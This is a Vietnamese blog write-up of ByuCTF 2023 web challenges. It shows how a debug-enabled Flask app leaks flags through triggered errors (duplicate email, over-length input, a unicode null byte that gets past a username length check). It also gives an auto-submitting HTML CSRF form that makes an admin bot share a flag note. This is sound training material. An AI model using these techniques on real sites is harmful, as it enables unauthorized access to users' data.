---
title: ByuCTF 2023
description: ByuCTF 2023
summary: Write up
cover: ./cover.jpg
published: '2023-05-21T12:00:00.000+07:00'
updated: '2023-05-21T12:00:00.000+07:00'
toc: false
tags:
  - [ ctf ]
---

Tuần này mình cũng có một buổi tối hơi hơi rảnh nên vào chơi si ti ép một xí xem như thế nào, và bl0g ơi sống lại thêm hôm nay nữa nhé =)))

# `urmombotnetdotnet.com`

> During my databases class, my group and I decided we'd create a web app with the domain urmombotnetdotnet.com, and wrote the relevant code. At first glance, it looks pretty good! I'd say we were pretty thorough. But were we thorough enough??

> Oh... we also forgot to make the front end :)

Đây là một bài viết bằng Flask có multi-flag, nghĩa là có nhiều chỗ để ta exploit, ban đầu mình cũng tưởng sẽ exploit kiểu theo các lỗ hổng thuần web thôi, nhưng khi đọc qua source thì bài này nó bật debug on, và các flag được ẩn trong các comment như này

![image](https://github.com/mrtlg/bl0g/assets/110890291/4984cb92-6938-430e-aa04-eab1d67488ab)

![image](https://github.com/mrtlg/bl0g/assets/110890291/1f80dcc9-5ac9-458c-9789-f26309ecd54a)

Vậy có thể hình dung được là với bài này, mình chỉ cần làm sao cho web bung ra lỗi, vì debug on nên flask sẽ in ra các dòng code cũng như chỉ ra lỗi như nào như nào, khi các dòng code được in ra đồng nghĩa với việc mấy cái comment kia mình cũng thấy nên đọc được flag luôn :) -> tìm các chỗ có lỗi login hay có flaw sai là được. Dạng này thì không phải lần đầu mình gặp, nhưng mà trông khi làm sẽ không vui bằng exploit lỗ hổng thuần. Luyên thuyên đủ rồi, mình sẽ bắt tay vào tìm flag 1.

## Flag 1

Search xem flag 1 nằm ở đâu để làm thì thấy nó trong endpoint `/api/register`

```python
@app.route('/api/register', methods=['POST'])
def post_register():
    # ensure needed parameters are present
    if (request.json is None) or ('email' not in request.json) or ('username' not in request.json) or ('password' not in request.json) or ('bitcoin_wallet' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    email = request.json['email']
    username = request.json['username']
    password = request.json['password']
    bitcoin_wallet = request.json['bitcoin_wallet']

    # ensure parameters are strings
    if type(email) is not str or type(username) is not str or type(password) is not str or type(bitcoin_wallet) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    
    # ensure email is valid
    if not re.fullmatch(r'\b[A-Za-z0-9._+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b', email):
        return jsonify({'message': 'Invalid email'}), 400
    
    # ensure username is valid
    if len(username) < 4 or len(username) > 255:
        return jsonify({'message': 'Invalid username length'}), 400
    
    # ensure username isn't already taken
    cur = mysql.connection.cursor()
    cur.execute("SELECT username FROM User WHERE username=%s", (username,))
    users_found = cur.rowcount
    cur.close()
    username_taken = (users_found > 0)

    if username_taken:
        return jsonify({'message': 'Username already taken'}), 500
    
    # ensure password is valid
    if len(password) < 12 or len(password) > 255:
        return jsonify({'message': 'Password doesn\'t fit length requirements'}), 400
    
    # ensure bitcoin wallet is valid
    if not re.fullmatch(r'0x[0-9a-fA-F]+', bitcoin_wallet):
        return jsonify({'message': 'Invalid bitcoin wallet'}), 400
    # byuctf{fakeflag1}
    # byuctf{did_you_stumble_upon_this_flag_by_accident_through_a_dup_email?}
    # insert user into database
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO User (email, username, password, blocked, bitcoin_wallet) VALUES (%s, %s, %s, %s, %s)", (email, username, sha256(password.encode()).hexdigest(), 0, bitcoin_wallet))
    mysql.connection.commit()
    user_id = cur.lastrowid
    cur.close()

    # add user as affiliate
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO Affiliates (user_id, Money_received, total_bots_added) VALUES (%s, %s, %s)", (user_id, 0, 0))
    mysql.connection.commit()
    cur.close()
    
    response = {"user_id": user_id}
    return jsonify(response), 200

```

Endpoint này theo code đọc cũng dễ hiểu, chỉ đơn giản là đăng kí account mới theo các data trong POST request, data sẽ là json. Nhìn chung thì đoạn code này xử lí các trường hợp như nhập kí tự đặc biệt hay sai kiểu dữ liệu cũng như kiểm tra độ dài đã khá oke rồi, không có gì bung được lỗi nên mình xem thêm setup sql xem các định dạng hay kiểu dữ liệu cũng như là độ dài 

```
CREATE TABLE User
(
  User_ID SERIAL NOT NULL,
  Email VARCHAR(128) NOT NULL,
  Username VARCHAR(128) NOT NULL,
  Password VARCHAR(128) NOT NULL,
  Blocked INT NOT NULL,
  Bitcoin_Wallet VARCHAR(256) NOT NULL,
  PRIMARY KEY (User_ID),
  UNIQUE (Email),
  UNIQUE (Username)
);
```

Đây là define của bảng User chứa thông tin user, dễ thấy bên dưới Email và username phải là Unique, xem lại đoạn python thì code không hề xử lí chỗ này, vậy ta chỉ cần đăng kí nick bị trùng email hoặc username với account khác là lỗi ngay

![image](https://github.com/mrtlg/bl0g/assets/110890291/a84f29c5-8d38-441c-bd4d-c8630e212482)

_Thấy fake flag do mình đang làm local, chả hiểu sao mấy bài khác thì chưa tắt mà bài này tắt rồi á_

## Flag 2

Flag 2 nằm tại endpoint `/api/tickets`

```python
@app.route('/api/tickets', methods=['POST'])
@token_required
def post_create_ticket(session_data):
    # ensure needed parameters are present
    if (request.json is None) or ('description' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    user_id = session_data["user_id"]
    description = request.json['description']
    timestamp = datetime.utcnow().isoformat()

    # ensure parameters are integers
    if type(description) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    # byuctf{fakeflag2}
    # byuctf{oof_remember_to_check_length_limit}
    # insert ticket into database
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO Support_Tickets (description, messages, time_stamp, user_id) VALUES (%s, %s, %s, %s)", (description, "", timestamp, user_id))
    mysql.connection.commit()
    ticket_id = cur.lastrowid
    cur.close()

    response = {"ticket_id": ticket_id, "description": description, "time_stamp": timestamp}

    return jsonify(response), 200
```

Để vô được endpoint này thì ta phải đăng nhập trước để có cookie token. Đoạn này cho ta post một ticket có data là `description` được lấy từ request sau đó được insert vào trong bảng `Support_Tickets`. Khác với endpoint register trên, data từ `description` này không được xử lí kĩ càng cho lắm, mình đoán tât có thể lợi dụng việc nó không kiểm tra độ dài như ở trên thì sẽ bung được lỗi, chui vào thẳng db xem cái bảng này

```
CREATE TABLE Support_Tickets
(
  Ticket_ID SERIAL NOT NULL,
  Description VARCHAR(2048) NOT NULL,
  Messages VARCHAR(2048) NOT NULL,
  Time_stamp VARCHAR(256) NOT NULL,
  User_ID BIGINT UNSIGNED NOT NULL,
  PRIMARY KEY (Ticket_ID),
  FOREIGN KEY (User_ID) REFERENCES User(User_ID)
);
```

Đúng như mình nghĩ, description chỉ có độ dài 2048, vậy sẽ thế nào nếu mình nhập nhiều hơn

![image](https://github.com/mrtlg/bl0g/assets/110890291/6c6fdc94-7ee0-4d7b-844f-56f42b9558b3)

hớ hớ

## Flag 4

>Bài này có tận 5 flag mà mình chỉ tìm được 1 2 4 thôi, nên ở đây một phát nhảy xuống 4 á =)). 

Flag 4 này nó nằm lại trong endpoint `/api/login`

```python
@app.route('/api/login', methods=['POST'])
def post_login():
    # ensure needed parameters are present
    if (request.json is None) or ('username' not in request.json) or ('password' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    username = request.json['username']
    password = request.json['password']

    # ensure parameters are strings
    if type(username) is not str or type(password) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    
    # ensure password is valid
    if len(password) < 12 or len(password) > 255:
        return jsonify({'message': 'Password doesn\'t fit length requirements'}), 400
    
    # check if username exists
    cur = mysql.connection.cursor()
    cur.execute("SELECT user_id,password,blocked FROM User WHERE username=%s", (username,))
    users_found = cur.rowcount
    response = cur.fetchone()
    cur.close()
    exists = (users_found > 0)

    if not exists:
        return jsonify({'message': 'Invalid username or password'}), 401
    

    user_id = response[0]
    hash = response[1]
    blocked = response[2]

    # check if user is staff
    cur = mysql.connection.cursor()
    cur.execute("SELECT * FROM Support_Staff WHERE user_id=%s", (user_id,))
    staff_found = cur.rowcount
    cur.close()
    is_staff = (staff_found > 0)
   
    # check if password is correct
    if sha256(password.encode()).hexdigest() != hash:
        return jsonify({'message': 'Invalid username or password'}), 401
    
    # check if user is blocked
    if blocked:
        return jsonify({'message': 'User is blocked'}), 401
    
    # generate JWT
    token = jwt.encode({'user_id': user_id, "is_staff": is_staff}, app.config['SECRET_KEY'], algorithm='HS256')

    resp = make_response(jsonify({'message': 'Successfully logged in', 'flag':('byuctf{fakeflag4}' if len(username) < 4 else 'Nope')}), 200)
    resp.set_cookie('token', token, httponly=True, samesite='Strict', max_age=None)

    return resp
```

Lần này flag không phải trong comment mà trong response của server luôn, sẽ in ra nếu username ta đăng kí có độ dài bé hơn 4. Nhớ lại đoạn register, độ dài username phải ít nhất là 4, mà ở đây yêu cầu bé hơn 4 mới ra flag, vậy bypass sao giờ :<.

Trong statement if kiểm tra độ dài, ta thấy `username` được lấy thẳng từ request để kiểm tra, không đi qua sanitize hay gì filter gì hết, cộng thêm việc python có một vài cơ chế encode decode khá là magic nên mình lợi dụng chỗ này để exploit, có nhiều cách mà ở đây cho dễ thì mình dùng unicode

![image](https://github.com/mrtlg/bl0g/assets/110890291/d855b804-de55-44d2-b103-16246a71068a)

Trong python `\u` biểu thị cho unicode, tương tự với `\b` `\r` `\f` `\x`. Nhờ thằng này mà mình có thể craft được kí tự null kia, tại sao lại là null. Vì khi mysql gặp thằng này, nó sẽ auto bỏ qua mà không xử lí (hoặc khi python gọi query chỗ này cộng thêm có byte null rồi đi vô sql server thì sẽ bỏ qua, chỗ này mình sẽ phải debug lại để hiểu hơn)

![image](https://github.com/mrtlg/bl0g/assets/110890291/4e4e48b7-d182-4f4d-9eec-45bccde0aa3d)

![image](https://github.com/mrtlg/bl0g/assets/110890291/1a3260de-8ce0-4a1e-8fc7-832585d32499)

Lúc này username ta bypass được chỗ kiểm tra độ dài là 4 và lưu trong db là `cc` chỉ có 2 mà thôi, ez login

![image](https://github.com/mrtlg/bl0g/assets/110890291/c09d8ec3-b326-4ba2-b800-27b81442605f)


# Notes

Bài này cho source và một url tới admin bot và source của bot luôn -> client side. Cùng phân tích vài chỗ quan trọng trong source.

## `server.py`

```python  
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
FLAG = open("flag.txt", "r").read()
SECRET = open("secret.txt", "r").read()
users = [{'username':'admin','password':SECRET}] # NEVER DO THIS IN PRODUCTION fyi
notes = [{
    "note":FLAG,
    "user":"admin",
    "id":"00000000000000000000000000000000",
    "shared":[]
}]
csrf_tokens = []
```

Có sẵn user admin và admin có note chứa flag. Bên dưới ta thấy có một list `csrf_tokens` được khai báo.

```python 
@app.route('/share', methods=['GET', 'POST'])
def share():
    global csrf_tokens
    
    if len(csrf_tokens) > 200:
        csrf_tokens = []

    if 'username' not in session:
        return redirect('/login')
    
    if request.method == 'POST':
        if 'note_id' not in request.form or 'user' not in request.form or 'csrf_token' not in request.form:
            return 'note_id cannot be empty'
        
        if not isinstance(request.form['note_id'], str) or not isinstance(request.form['user'], str) or not isinstance(request.form['csrf_token'], str):
            return 'All parameters must be a string'
        
        if request.form['csrf_token'] not in csrf_tokens:
            return 'CSRF token is invalid'
        
        if len(request.form['note_id']) != 32:
            return 'note_id must be 32 characters'
        
        note_exists = False
        for note in notes:
            if note['id'] == request.form['note_id']:
                note_exists = True
                break
        
        if not note_exists:
            return 'note_id is invalid'
        
        user_exists = False
        for user in users:
            if user['username'] == request.form['user']:
                user_exists = True
                break
        
        if not user_exists:
            return 'User does not exist'
        
        for note in notes:
            if note['id'] == request.form['note_id'] and note['user'] == session['username']:
                note['shared'].append(request.form['user'])
                return redirect('/notes')
            
        return 'You don\'t own this note'
    
    token = secrets.token_hex(32)
    csrf_tokens.append(token)

    return f'''
        <h1>Share note</h1>
        <form method="post">
            <p><label for="note_id">Note ID</label>
            <input type=text name=note_id>
            <p><label for="user">User</label>
            <input type=text name=user>
            <p><input type=submit value=Share>
            <input type=hidden name=csrf_token value={token}>
        </form>

        <a href="/notes"><h3>View notes</h3></a>
    '''
```

Tại endpoint `/share` này, nếu là POST thì sẽ nhận data là `note_id`, `csrf_token` và `user`, endpoint này có chức năng share cái note theo note_id tới user trong data user. Phía dưới sẽ thêm vào list `csrf_tokens` một chuỗi tạo từ `secrets.token_hex`.

## admin-bot.js

```javascript 
const visitUrl = async (url) => {

    let browser =
            await puppeteer.launch({
                headless: "new",
                pipe: true,
                dumpio: true,

                // headless chrome in docker is not a picnic
                args: [
                    '--no-sandbox',
                    '--disable-gpu',
                    '--disable-software-rasterizer',
                    '--disable-dev-shm-usage',
                    '--disable-setuid-sandbox',
                    '--js-flags=--noexpose_wasm,--jitless'
                ]
            })

    try {
        const page = await browser.newPage()

        try {
            await page.setUserAgent('puppeteer');
            
            // login
            await page.goto('http://127.0.0.1:1337/login', { timeout: 5000, waitUntil: 'networkidle2' })
            await page.type('#username', 'admin');
            await page.type('#password', SECRET);
            await Promise.all([
                page.click('#formsubmit'),
                page.waitForNavigation({ waitUntil: 'networkidle0' }),
            ]);

            // visit the page
            await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
        } finally {
            await page.close()
        }
    }
    finally {
        browser.close()
        return
    }
}
```

Con bot này dùng `puppeteer` để ban đầu, đơn giản chỉ là truy cập tới login và login dưới user admin, sau đó sẽ truy cập đến url mà ta nhập vào.

Sau khi phân tích xong, bài này ta có thể dễ dàng biết được lỗi là CSRF ngay tại endpoint share, khi con bot đăng nhập dưới quyền admin thì sẽ truy cập đến url ta, ta chỉ cần host file html sao cho chứa form có action đến endpoint share này và bắt con bot (hay là admin hiện tại), share cái note flag qua cho account của ta.

Tuy nhiên có một vấn đề, các input của form này sẽ như trên ta phân tích là `note_id` để chứa id của cái note flag có sẵn, `user` là user của account ta tạo; VÀ `csrf_token`, chính là cái sẽ hơi gây khó khăn cho ta.

Đối với những bài mà kiểu notes vầy trong các event CTF khác, mình phải làm cách nào đó extract được csrf_token từ HTMl của web, hoặc tìm chỗ XSS để bypass CORS, vân vân mây mây. Nhưng với bài này thì đơn giản hơn nhiều, nhớ lại lúc nãy khi phân tích về cái list `csrf_token` kia, ta thấy được token sẽ được tạo và append thẳng vào list khi ta truy cập đến endpoint share, nhưng cái list này lại dùng chung cho cả app :D, tức là dù ta là user hay admin đều dùng chung cái list đấy :D, cho nên mình mới bảo bài này nó hơi đơn giản.

Tóm lại những việc cần làm của mình để exploit bài này như sau

- Đầu tiên thì ta tạo account, tạo tên gì cũng được miễn đúng định dạng như code yêu cầu

![image](https://github.com/mrtlg/bl0g/assets/110890291/e0460471-7c81-4c13-a76c-40ced097920f)

- Vô endpoint share để nó append cái csrf token vào list, lấy cái token đó ra

![image](https://github.com/mrtlg/bl0g/assets/110890291/7679ec01-24fa-4087-9a7a-20d5d04b9b60)

- Tạo payload exploit csrf

```html 
<form action="http://127.0.0.1:1337/share" method="POST" id="csrf">
  <input type="text" name="note_id" value="00000000000000000000000000000000">
  <input type="text" name="user" value="manhtienmanhtien">
  <input type="text" name="csrf_token" value="c6d66d3a9847bb61bbb572bc376e930f8e5d5db5a9fdaaa42a8d4d7db930e71c">
</form>
<script>
  csrf.submit();
</script>
```

- Host lên và gửi cho bot, đợi vài giây cho nó request và check lại trong note của ta là thấy phờ lác

![image](https://github.com/mrtlg/bl0g/assets/110890291/7c8fa350-ed04-4788-8d96-f43bd847a05e)

![image](https://github.com/mrtlg/bl0g/assets/110890291/51b4faa5-9a35-400c-8195-219c502750b0)
